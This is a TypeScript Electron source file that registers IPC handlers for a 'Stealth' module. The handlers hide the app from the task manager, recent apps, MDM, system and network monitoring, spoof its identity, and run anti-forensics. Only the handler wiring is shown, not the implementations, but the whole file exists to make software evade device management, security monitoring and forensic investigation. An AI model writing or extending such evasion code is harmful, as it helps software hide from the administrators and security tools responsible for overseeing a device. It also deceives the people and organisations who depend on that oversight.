import { ipcMain } from 'electron';
import { Stealth } from '../stealth/Stealth';

const stealth = new Stealth();

export function setupStealthHandlers() {
  // Activate complete stealth
  ipcMain.handle('stealth:activate', async () => {
    return stealth.completeStealthMode();
  });

  // Hide from recent apps
  ipcMain.handle('stealth:hide-recent', async () => {
    stealth.hideFromRecentApps();
    return { success: true };
  });

  // Spoof app identity
  ipcMain.handle('stealth:spoof-identity', async () => {
    return stealth.spoofAppIdentity();
  });

  // Hide from task manager
  ipcMain.handle('stealth:hide-taskmanager', async () => {
    return stealth.hideFromTaskManager();
  });

  // Hide from MDM
  ipcMain.handle('stealth:hide-mdm', async () => {
    return stealth.hideFromMDM();
  });

  // Hide from monitoring
  ipcMain.handle('stealth:hide-monitoring', async () => {
    return stealth.hideFromMonitoring();
  });

  // Hide from network monitoring
  ipcMain.handle('stealth:hide-network', async () => {
    return stealth.hideFromNetworkMonitoring();
  });

  // Anti-detection filtering
  ipcMain.handle('stealth:anti-filter', async () => {
    return stealth.antiDetectionFiltering();
  });

  // Anti-forensics
  ipcMain.handle('stealth:antiforensics', async () => {
    return stealth.antiForensics();
  });

  // Verify stealth
  ipcMain.handle('stealth:verify', async () => {
    return stealth.verifyStealthActive();
  });
}
